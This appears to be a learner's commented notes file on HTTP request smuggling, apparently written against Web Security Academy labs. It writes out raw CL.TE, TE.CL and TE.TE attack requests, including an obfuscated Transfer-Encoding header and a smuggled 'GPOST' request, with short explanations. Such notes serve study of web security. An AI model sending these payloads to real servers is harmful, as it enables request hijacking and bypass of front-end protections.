// HTTP Request Smuggling
//! Exploiting
//* CL.TE vulnerabilities
// POST / HTTP/1.1
// Host: vulnerable-website.com
// Content-Length: 13 => front end will send all data
// Transfer-Encoding: chunked => back end will think it's the end on the 0
// 0
// SMUGGLED => this will be treated as the start of the next request
//* TE.CL vulnerabilities
// POST / HTTP/1.1
// Host: vulnerable-website.com
// Content-Length: 3 => server will recive nothing from the first request
// Transfer-Encoding: chunked => front end will send shunks
// 8 => lenght of the second chunk
// SMUGGLED => this will be treated as the start of the next request
// 0
// this will resutl in the next request staring with SMUGGLED0

// if you want something specific you can send a second request (you might get the response for this request also )

// Content-length: 4
// Transfer-Encoding: chunked

// 5c
// GPOST / HTTP/1.1
// Content-Type: application/x-www-form-urlencoded
// Content-Length: 15

// x=1
// 0\r\n\r\n
//* TE.TE behavior: obfuscating the TE header
// POST / HTTP/1.1
// Host: YOUR-LAB-ID.web-security-academy.net
// Content-Type: application/x-www-form-urlencoded
// Content-length: 4 // trun off auto content length calculation
// Transfer-Encoding: chunked // front end thinks this is chunked
// Transfer-encoding: cow // backend thinks it is not so it relies on content-length

// 5c
// GPOST / HTTP/1.1
// Content-Type: application/x-www-form-urlencoded
// Content-Length: 15

// x=1
// 0
